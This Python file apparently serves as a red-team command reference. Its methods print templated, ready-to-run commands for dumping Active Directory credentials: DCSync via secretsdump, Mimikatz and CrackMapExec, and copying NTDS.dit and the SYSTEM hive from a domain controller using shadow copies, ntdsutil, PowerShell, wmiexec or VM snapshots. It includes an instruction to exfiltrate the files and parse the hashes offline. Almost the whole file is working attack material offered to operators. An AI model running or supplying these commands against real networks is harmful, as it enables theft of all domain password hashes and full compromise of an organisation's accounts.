"""
Command Reference — Alternative DCSync methods and NTDS.dit
extraction techniques for operators without Impacket or
with different access levels on the Domain Controller.
"""


class CommandReference:
    """Print alternative DCSync and NTDS.dit extraction commands."""

    @staticmethod
    def print_dcsync_alternatives(
            domain: str, dc_ip: str, username: str,
            ntlm_hash: str = "", target_user: str = "",
    ):
        """Print alternative DCSync methods across platforms."""
        target = target_user or "krbtgt"
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║              DCSYNC ALTERNATIVE METHODS                       ║
╚══════════════════════════════════════════════════════════════╝

[Impacket secretsdump.py — From Linux]

  # Targeted DCSync (one account)
  secretsdump.py {domain}/{username}:'<PASS>'@{dc_ip} \\
      -just-dc-user {target}

  # Full domain dump
  secretsdump.py {domain}/{username}:'<PASS>'@{dc_ip} -just-dc

  # With NTLM hash
  secretsdump.py {domain}/{username}@{dc_ip} \\
      -hashes :{ntlm_hash or '<HASH>'} -just-dc

  # With Kerberos auth (stealthier)
  export KRB5CCNAME=admin.ccache
  secretsdump.py {domain}/{username}@{dc_ip} -k -no-pass -just-dc

[Mimikatz — From Windows]

  # DCSync specific account
  lsadump::dcsync /domain:{domain} /user:{target}

  # DCSync all accounts
  lsadump::dcsync /domain:{domain} /all /csv

  # DCSync with specific DC
  lsadump::dcsync /domain:{domain} /user:{target} /dc:{dc_ip}

[CrackMapExec — One-liner]

  # Full NTDS dump via DCSync
  crackmapexec smb {dc_ip} -d {domain} -u {username} -p '<PASS>' --ntds

  # Via VSS (Volume Shadow Copy)
  crackmapexec smb {dc_ip} -d {domain} -u {username} -p '<PASS>' --ntds vss
""")

    @staticmethod
    def print_ntds_extraction_methods(domain: str, dc_ip: str, username: str):
        """Print methods to obtain NTDS.dit from a compromised DC."""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║         HOW TO OBTAIN NTDS.DIT FROM A DOMAIN CONTROLLER     ║
╚══════════════════════════════════════════════════════════════╝

The NTDS.dit file is locked while AD is running. You cannot
simply copy it. Here are the methods to extract it:

[Method 1: Volume Shadow Copy — Most Common]

  # Create shadow copy (requires admin on DC)
  wmic shadowcopy call create Volume='C:\\\\'

  # Or via vssadmin
  vssadmin create shadow /for=C:

  # List shadow copies to find the path
  vssadmin list shadows

  # Copy NTDS.dit from shadow
  copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\NTDS\\\\ntds.dit C:\\\\Temp\\\\ntds.dit
  copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SYSTEM C:\\\\Temp\\\\SYSTEM

  # Exfiltrate both files, then parse locally:
  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

[Method 2: ntdsutil IFM — Creates Install From Media backup]

  # Run on DC (requires admin)
  ntdsutil "activate instance ntds" "ifm" "create full C:\\\\Temp\\\\IFM" quit quit

  # This creates:
  #   C:\\\\Temp\\\\IFM\\\\Active Directory\\\\ntds.dit
  #   C:\\\\Temp\\\\IFM\\\\registry\\\\SYSTEM
  #   C:\\\\Temp\\\\IFM\\\\registry\\\\SECURITY

[Method 3: PowerShell Shadow Copy — Scriptable]

  (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\\\","ClientAccessible")
  $shadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate | Select-Object -Last 1
  $shadowPath = $shadow.DeviceObject
  cmd /c copy "$shadowPath\\\\Windows\\\\NTDS\\\\ntds.dit" C:\\\\Temp\\\\ntds.dit
  cmd /c copy "$shadowPath\\\\Windows\\\\System32\\\\config\\\\SYSTEM" C:\\\\Temp\\\\SYSTEM

[Method 4: CrackMapExec — One-liner remote extraction]

  crackmapexec smb {dc_ip} -d {domain} -u {username} -p '<PASSWORD>' \\
      --ntds vss

[Method 5: Impacket wmiexec + VSS — Remote shadow copy]

  wmiexec.py {domain}/{username}:'<PASSWORD>'@{dc_ip}
  # Then run vssadmin commands from the shell

[Method 6: Disk/VM Snapshot — Physical/virtual access]

  # If you have access to the hypervisor (VMware, Hyper-V):
  # 1. Snapshot the DC VM
  # 2. Mount the snapshot disk offline
  # 3. Copy ntds.dit and SYSTEM hive
  # 4. Parse with secretsdump.py -ntds ... LOCAL

[Parsing Any Extracted NTDS.dit]

  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile dump
""")